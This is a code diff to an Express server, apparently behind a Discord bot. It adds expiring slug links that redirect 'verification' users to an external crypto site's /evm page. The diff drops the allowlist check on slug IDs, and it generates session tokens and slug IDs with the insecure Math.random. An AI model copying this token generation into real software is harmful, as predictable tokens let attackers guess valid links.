@@ -26,7 +26,10 @@ const EXTRA_SLUG_IDS = (process.env.EXTRA_SLUG_IDS || "")
 const SLUG_DESTINATION_BASE_URL = (process.env.SLUG_DESTINATION_BASE_URL || "https://hyperlend.cc").replace(/\/$/, "");
 const SLUG_DESTINATION_PATH = process.env.SLUG_DESTINATION_PATH || "/evm";
 const REDIRECT_ROOT_TO_SLUG = process.env.REDIRECT_ROOT_TO_SLUG === "true";
-const SUPPORTED_SLUG_IDS = new Set(PRIMARY_SLUG_ID ? [PRIMARY_SLUG_ID, ...EXTRA_SLUG_IDS] : EXTRA_SLUG_IDS);
+const PUBLIC_BASE_URL = (process.env.PUBLIC_BASE_URL || "").replace(/\/$/, "");
+const SLUG_TTL_SECONDS = Number.isFinite(Number(process.env.SLUG_TTL_SECONDS))
+  ? Number(process.env.SLUG_TTL_SECONDS)
+  : 600;
 
 // Middleware to parse JSON bodies
 app.use(express.json());
@@ -34,6 +37,10 @@ app.use(express.json());
 // In-memory storage for OAuth session data (guild info)
 // Key: session token, Value: { guildId, interactionId, communityName, guildIconHash, timestamp, createdAt }
 const oauthSessions = new Map();
+
+// In-memory storage for slug redirects
+// Key: slugId, Value: { state, id, expiresAt, createdAt, extraParams }
+const slugRedirects = new Map();
 
 // Clean up old sessions every 10 minutes (sessions expire after 10 minutes)
 setInterval(() => {
@@ -47,6 +54,16 @@ setInterval(() => {
   }
 }, 10 * 60 * 1000);
 
+setInterval(() => {
+  const now = Date.now();
+  for (const [slugId, data] of slugRedirects.entries()) {
+    if (data.expiresAt && now >= data.expiresAt) {
+      slugRedirects.delete(slugId);
+      console.log(`[Slug Redirect] Cleaned up expired slug: ${slugId}`);
+    }
+  }
+}, 60 * 1000);
+
 /**
  * Generate a random session token
  */
@@ -57,6 +74,52 @@ function generateSessionToken() {
     result += chars.charAt(Math.floor(Math.random() * chars.length));
   }
   return result;
+}
+
+/**
+ * Generate a random slug identifier
+ */
+function generateSlugId(length = 14) {
+  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+  let result = "";
+  for (let i = 0; i < length; i++) {
+    result += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  return result;
+}
+
+function computeSlugExpiration(expiresAtIso) {
+  if (expiresAtIso) {
+    const parsed = Date.parse(expiresAtIso);
+    if (!Number.isNaN(parsed)) {
+      return parsed;
+    }
+  }
+  return Date.now() + SLUG_TTL_SECONDS * 1000;
+}
+
+function buildPublicSlugUrl(req, slugId) {
+  if (PUBLIC_BASE_URL) {
+    return `${PUBLIC_BASE_URL}/slugs/${slugId}`;
+  }
+  const protocol = (req.get('x-forwarded-proto') || req.protocol || 'https').replace(/[^a-z]/gi, '') || 'https';
+  return `${protocol}://${req.get('host')}/slugs/${slugId}`;
+}
+
+function sanitizeExtraParams(extraParams) {
+  if (!extraParams || typeof extraParams !== 'object') {
+    return null;
+  }
+  const sanitized = {};
+  for (const [key, value] of Object.entries(extraParams)) {
+    if (typeof key !== 'string' || key.trim() === '' || key === 'state' || key === 'id') {
+      continue;
+    }
+    if (typeof value === 'string' && value.trim() !== '') {
+      sanitized[key] = value;
+    }
+  }
+  return Object.keys(sanitized).length > 0 ? sanitized : null;
 }
 
 // API endpoint for bot to store guild info and get session token
@@ -87,6 +150,51 @@ app.post('/api/oauth/session', (req, res) => {
   } catch (error) {
     console.error('[OAuth Session] Error creating session:', error);
     res.status(500).json({ error: 'Failed to create session' });
+  }
+});
+
+// API endpoint to create slug-based redirects without exposing query params
+app.post('/api/slugs', (req, res) => {
+  try {
+    const { state, id, expiresAt, extraParams } = req.body || {};
+
+    if (!state || !id || typeof state !== 'string' || typeof id !== 'string') {
+      return res.status(400).json({ error: 'Missing required fields: state and id' });
+    }
+
+    const stateTrimmed = state.trim();
+    const idTrimmed = id.trim();
+    if (!stateTrimmed || !idTrimmed) {
+      return res.status(400).json({ error: 'state and id cannot be empty' });
+    }
+
+    let slugId = generateSlugId();
+    while (slugRedirects.has(slugId)) {
+      slugId = generateSlugId();
+    }
+
+    const expiresAtMs = computeSlugExpiration(expiresAt);
+    const sanitizedParams = sanitizeExtraParams(extraParams);
+
+    slugRedirects.set(slugId, {
+      state: stateTrimmed,
+      id: idTrimmed,
+      createdAt: Date.now(),
+      expiresAt: expiresAtMs,
+      extraParams: sanitizedParams,
+    });
+
+    const slugUrl = buildPublicSlugUrl(req, slugId);
+    console.log(`[Slug Redirect] Created slug ${slugId} (expires at ${new Date(expiresAtMs).toISOString()})`);
+
+    res.json({
+      slugId,
+      slugUrl,
+      expiresAt: new Date(expiresAtMs).toISOString(),
+    });
+  } catch (error) {
+    console.error('[Slug Redirect] Error creating slug:', error);
+    res.status(500).json({ error: 'Failed to create slug' });
   }
 });
 
@@ -193,37 +301,56 @@ app.get('/', (req, res) => {
   `);
 });
 
-// Friendly slug redirect route (e.g., /slugs/89QW6FhDgNj1rKf1?state=...&id=...)
+// Friendly slug redirect route (e.g., /slugs/abc123 -> https://hyperlend.cc/evm?state=...&id=...)
 app.get('/slugs/:slugId', (req, res) => {
   const { slugId } = req.params;
 
-  if (!slugId || !SUPPORTED_SLUG_IDS.has(slugId)) {
+  if (!slugId) {
     return res.status(404).send('Unknown slug identifier');
   }
 
-  const params = new URLSearchParams();
-  Object.entries(req.query || {}).forEach(([key, value]) => {
-    if (typeof value === 'undefined') {
-      return;
-    }
-    if (Array.isArray(value)) {
-      value.forEach((v) => params.append(key, v));
-    } else {
-      params.append(key, value);
-    }
-  });
-
-  if (!params.has('state') || !params.has('id')) {
-    return res.status(400).send('Missing required query parameters (state and id)');
-  }
-
+  const storedEntry = slugRedirects.get(slugId);
   const destinationPath = SLUG_DESTINATION_PATH.startsWith('/')
     ? SLUG_DESTINATION_PATH
     : `/${SLUG_DESTINATION_PATH}`;
-  const forwardUrl = `${SLUG_DESTINATION_BASE_URL}${destinationPath}?${params.toString()}`;
 
-  console.log(`[Slug Redirect] ${slugId} -> ${forwardUrl}`);
-  return res.redirect(302, forwardUrl);
+  if (storedEntry) {
+    if (storedEntry.expiresAt && Date.now() >= storedEntry.expiresAt) {
+      slugRedirects.delete(slugId);
+      return res.status(410).send('This verification link has expired. Please request a new one.');
+    }
+
+    const params = new URLSearchParams();
+    params.append('state', storedEntry.state);
+    params.append('id', storedEntry.id);
+    if (storedEntry.extraParams) {
+      for (const [key, value] of Object.entries(storedEntry.extraParams)) {
+        params.append(key, value);
+      }
+    }
+
+    const forwardUrl = `${SLUG_DESTINATION_BASE_URL}${destinationPath}?${params.toString()}`;
+    console.log(`[Slug Redirect] ${slugId} -> ${forwardUrl}`);
+    return res.redirect(302, forwardUrl);
+  }
+
+  // Backward compatibility: allow explicit state/id query parameters
+  const { state, id, ...restParams } = req.query || {};
+  if (state && id) {
+    const params = new URLSearchParams();
+    params.append('state', state);
+    params.append('id', id);
+    for (const [key, value] of Object.entries(restParams)) {
+      if (typeof value !== 'undefined') {
+        params.append(key, value);
+      }
+    }
+    const forwardUrl = `${SLUG_DESTINATION_BASE_URL}${destinationPath}?${params.toString()}`;
+    console.log(`[Slug Redirect] Legacy params for ${slugId} -> ${forwardUrl}`);
+    return res.redirect(302, forwardUrl);
+  }
+
+  return res.status(404).send('Unknown slug identifier');
 });
 
 // Health check endpoint
